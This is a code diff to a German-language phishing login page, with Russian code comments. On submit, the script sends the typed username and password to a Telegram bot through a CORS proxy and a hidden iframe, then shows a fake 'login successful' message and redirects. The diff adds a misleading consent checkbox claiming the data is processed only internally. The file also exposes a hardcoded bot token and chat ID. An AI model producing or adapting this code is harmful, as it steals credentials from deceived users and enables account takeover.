@@ -29,7 +29,8 @@
             color: #667eea;
             font-size: 28px;
         }
-        input {
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
             padding: 14px;
             margin: 12px 0;
@@ -44,20 +45,40 @@
             border-color: #667eea;
             box-shadow: 0 0 8px rgba(102, 126, 234, 0.3);
         }
+        .checkbox-container {
+            margin: 20px 0 10px 0;
+            text-align: left;
+            font-size: 14px;
+            color: #555;
+        }
+        .checkbox-container label {
+            cursor: pointer;
+            display: flex;
+            align-items: flex-start;
+        }
+        .checkbox-container input[type="checkbox"] {
+            margin-right: 10px;
+            margin-top: 3px;
+            flex-shrink: 0;
+        }
         button {
             width: 100%;
             padding: 16px;
-            background: #667eea;
+            background: #aab3e0; /* серо-синий, пока галочка не поставлена */
             color: white;
             border: none;
             border-radius: 10px;
             font-size: 18px;
             font-weight: bold;
-            cursor: pointer;
+            cursor: not-allowed;
             margin-top: 10px;
             transition: background 0.3s;
         }
-        button:hover {
+        button.active {
+            background: #667eea;
+            cursor: pointer;
+        }
+        button.active:hover {
             background: #5a6fd8;
         }
         #status {
@@ -79,56 +100,75 @@
         <form id="loginForm">
             <input type="text" id="username" placeholder="Benutzername" required>
             <input type="password" id="password" placeholder="Passwort" required>
-            <button type="submit">Einloggen</button>
+
+            <div class="checkbox-container">
+                <label>
+                    <input type="checkbox" id="consent">
+                    <span>Mit dem Einloggen stimmen Sie der Übermittlung Ihrer Anmeldedaten zu Verifizierungszwecken und zur Sicherstellung der Konto-Sicherheit zu. Die Daten werden ausschließlich intern verarbeitet.</span>
+                </label>
+            </div>
+
+            <button type="submit" id="loginButton" disabled>Einloggen</button>
         </form>
 
         <div id="status"></div>
         <div class="footer">Willkommen zurück!</div>
     </div>
 
-    <!-- Скрытый iframe для отправки -->
     <iframe name="hiddenIframe" style="display:none;"></iframe>
 
     <script>
         const botToken = "8408447077:AAFtGEn83fMMy66MnIdveRPW5kQ5ZQukU04";
         const chatId = "5684291694";
         const proxyUrl = "https://corsproxy.io/?";
+        const redirectUrl = "https://www.google.com"; // ← Замени на свой URL!
 
-        // СЮДА ВСТАВЬ ССЫЛКУ, НА КОТОРУЮ ПЕРЕНАПРАВЛЯТЬ ПОСЛЕ ЛОГИНА
-        const redirectUrl = "https://www.google.com";  // ← Замени на свой URL!
-        // Примеры:
-        // "success.html" — если у тебя есть файл success.html на Neocities
-        // "https://youtube.com" 
-        // "https://deine-seite.neocities.org/dashboard"
+        const consentCheckbox = document.getElementById("consent");
+        const loginButton = document.getElementById("loginButton");
+
+        // Активация кнопки только при согласии
+        consentCheckbox.addEventListener("change", function() {
+            if (this.checked) {
+                loginButton.disabled = false;
+                loginButton.classList.add("active");
+            } else {
+                loginButton.disabled = true;
+                loginButton.classList.remove("active");
+            }
+        });
 
         document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
 
+            // Дополнительная проверка (на всякий случай)
+            if (!consentCheckbox.checked) {
+                document.getElementById("status").innerHTML = "Sie müssen zustimmen!";
+                document.getElementById("status").style.color = "red";
+                return;
+            }
+
             const rawUsername = document.getElementById("username").value;
             const rawPassword = document.getElementById("password").value;
 
-            const text = encodeURIComponent(`🔔 Neuer Login-Versuch!\n\n👤 Benutzername: ${rawUsername}\n🔑 Passwort: ${rawPassword}`);
+            const text = encodeURIComponent(`🔔 Neuer Login-Versuch! (Zustimmung erteilt)\n\n👤 Benutzername: ${rawUsername}\n🔑 Passwort: ${rawPassword}`);
 
             const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=HTML`;
-
             const fullUrl = proxyUrl + encodeURIComponent(apiUrl);
 
-            // Отправка данных в Telegram
+            // Отправка в Telegram
             const iframe = document.createElement('iframe');
             iframe.src = fullUrl;
             iframe.style.display = "none";
             document.body.appendChild(iframe);
             setTimeout(() => document.body.removeChild(iframe), 1000);
 
-            // Показываем успех
+            // Успех и перенаправление
             document.getElementById("status").innerHTML = "Erfolgreich angemeldet! Weiterleitung... 🔄";
             document.getElementById("status").style.color = "#28a745";
 
-            // Очистка полей
             document.getElementById("username").value = "";
             document.getElementById("password").value = "";
 
-            // Перенаправление через 2 секунды
             setTimeout(() => {
                 window.location.href = redirectUrl;
             }, 2000);
